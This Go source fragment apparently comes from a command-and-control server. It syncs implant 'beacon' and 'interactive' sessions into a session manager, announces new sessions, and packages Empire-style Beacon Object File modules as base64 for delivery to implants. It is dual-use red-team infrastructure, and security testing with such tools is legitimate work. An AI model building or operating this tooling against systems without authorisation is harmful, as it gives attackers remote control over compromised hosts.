func (is *InteractiveServer) syncSessions() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !is.isServerRunning() || is.server == nil {
			continue
		}

		// Sync sessions from server to session manager
		serverSessions := is.server.GetSessions()
		for id, serverSession := range serverSessions {
			// Check if session exists
			if existingSession, exists := is.sessionMgr.GetSession(id); exists {
				// Update existing session metadata
				existingSession.UpdateLastSeen()

				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						existingSession.SetMetadata(key, value)
					}
				}

				// Update RemoteAddr if changed
				if serverSession.RemoteAddr != "" && existingSession.RemoteAddr != serverSession.RemoteAddr {
					// Note: RemoteAddr isn't directly settable, but we can update via metadata
					existingSession.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}
			} else {
				// Create new session in manager with full metadata
				sessionType := core.SessionTypeBeacon
				if upgraded, ok := serverSession.Metadata["upgraded"].(bool); ok && upgraded {
					sessionType = core.SessionTypeInteractive
				}

				transport := "http"
				if t, ok := serverSession.Metadata["transport"].(string); ok {
					transport = t
				}

				session := core.NewSession(id, sessionType, transport)

				// Copy metadata from server session
				if serverSession.Metadata != nil {
					for key, value := range serverSession.Metadata {
						session.SetMetadata(key, value)
					}
				}

				// Store remote address in metadata (since RemoteAddr isn't directly settable)
				if serverSession.RemoteAddr != "" {
					session.SetMetadata("remote_addr", serverSession.RemoteAddr)
				}

				is.sessionMgr.AddSession(session)

				// Note: SessionOpened event is automatically published by SessionManager.AddSession()
				// Reactions system subscribes to EventBroker and handles it automatically
			}
		}
	}
}

// syncSessionsWithContext periodically syncs sessions from the server (with context cancellation)
func (is *InteractiveServer) syncSessionsWithContext(ctx context.Context) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Sync sessions from main server to session manager
			if is.server != nil {
				serverSessions := is.server.GetSessions()
				for id, serverSession := range serverSessions {
					is.syncSessionToManager(id, serverSession, "main")
				}
			}

			// Sync sessions from HTTP transports to session manager
			is.httpTransportsMu.RLock()
			for addr, httpTransport := range is.httpTransports {
				httpSessions := httpTransport.GetSessions()
				for id, httpSession := range httpSessions {
					is.syncSessionToManager(id, httpSession, fmt.Sprintf("http:%s", addr))
				}
			}
			is.httpTransportsMu.RUnlock()
		}
	}
}

// syncSessionToManager syncs a single session from server/transport to session manager
func (is *InteractiveServer) syncSessionToManager(id string, serverSession *transport.Session, source string) {
	// Check if session exists
	if existingSession, exists := is.sessionMgr.GetSession(id); exists {
		// Update existing session metadata
		existingSession.UpdateLastSeen()

		// Copy metadata from server session
		if serverSession.Metadata != nil {
			for key, value := range serverSession.Metadata {
				existingSession.SetMetadata(key, value)
			}
		}

		// Update RemoteAddr if changed
		if serverSession.RemoteAddr != "" && existingSession.RemoteAddr != serverSession.RemoteAddr {
			// Store in metadata since RemoteAddr isn't directly settable
			existingSession.SetMetadata("remote_addr", serverSession.RemoteAddr)
		}

		// Update transport source
		existingSession.SetMetadata("source", source)
	} else {
		// Create new session in manager with full metadata
		sessionType := core.SessionTypeBeacon
		if upgraded, ok := serverSession.Metadata["upgraded"].(bool); ok && upgraded {
			sessionType = core.SessionTypeInteractive
		}

		transportType := "http"
		if t, ok := serverSession.Metadata["transport"].(string); ok {
			transportType = t
		} else if strings.HasPrefix(source, "http:") {
			transportType = "http"
		}

		session := core.NewSession(id, sessionType, transportType)

		// Store remote address in metadata (since RemoteAddr isn't directly settable)
		if serverSession.RemoteAddr != "" {
			session.SetMetadata("remote_addr", serverSession.RemoteAddr)
		}

		// Copy metadata from server session
		if serverSession.Metadata != nil {
			for key, value := range serverSession.Metadata {
				session.SetMetadata(key, value)
			}
		}

		// Store source
		session.SetMetadata("source", source)

		is.sessionMgr.AddSession(session)

		// Print notification about new session (without interrupting prompt)
		// Use fmt.Printf with newline to ensure it appears properly
		fmt.Printf("\n[+] New session: %s (%s) from %s\n", shortID(id), sessionType, serverSession.RemoteAddr)
		if is.input != nil {
			is.input.SetPrompt(getPrompt(is.currentSession))
		}

		// Note: SessionOpened event is automatically published by SessionManager.AddSession()
		// Reactions system subscribes to EventBroker and handles it automatically
	}
}

// processBOFModule processes a BOF module and returns JSON with BOF data
func (is *InteractiveServer) processBOFModule(module *modules.EmpireModule, params map[string]string) (string, error) {
	if module.BOF == nil {
		return "", fmt.Errorf("module %s is not a BOF module", module.ID)
	}

	// Determine architecture from params (default to x64)
	arch := "x64"
	if archParam, ok := params["Architecture"]; ok {
		arch = strings.ToLower(archParam)
		if arch != "x64" && arch != "x86" {
			return "", fmt.Errorf("invalid architecture: %s (must be x64 or x86)", archParam)
		}
	}

	// Get BOF file path based on architecture
	var bofPath string
	if arch == "x64" {
		bofPath = module.BOF.X64
	} else {
		bofPath = module.BOF.X86
	}

	if bofPath == "" {
		return "", fmt.Errorf("BOF file path not specified for architecture %s", arch)
	}

	// Resolve BOF file path relative to empire-modules directory
	possiblePaths := []string{
		bofPath,
		filepath.Join("empire-modules", bofPath),
		filepath.Join("modules", "empire", bofPath),
	}

	var bofData []byte
	var err error
	var foundPath string
	for _, path := range possiblePaths {
		if _, err := os.Stat(path); err == nil {
			foundPath = path
			bofData, err = os.ReadFile(path)
			if err == nil {
				break
			}
		}
	}

	if foundPath == "" {
		return "", fmt.Errorf("BOF file not found: %s (tried: %v)", bofPath, possiblePaths)
	}
	if err != nil {
		return "", fmt.Errorf("failed to read BOF file %s: %w", foundPath, err)
	}

	// Get entry point (default to "go")
	entryPoint := module.BOF.EntryPoint
	if entryPoint == "" {
		entryPoint = "go"
	}

	// Get format string
	formatString := module.BOF.FormatString

	// Create response JSON
	response := map[string]interface{}{
		"bof_data":     base64.StdEncoding.EncodeToString(bofData),
		"entry_point":  entryPoint,
		"format_string": formatString,
	}

	jsonData, err := json.Marshal(response)
	if err != nil {
		return "", fmt.Errorf("failed to marshal BOF response: %w", err)
	}

	return string(jsonData), nil
}
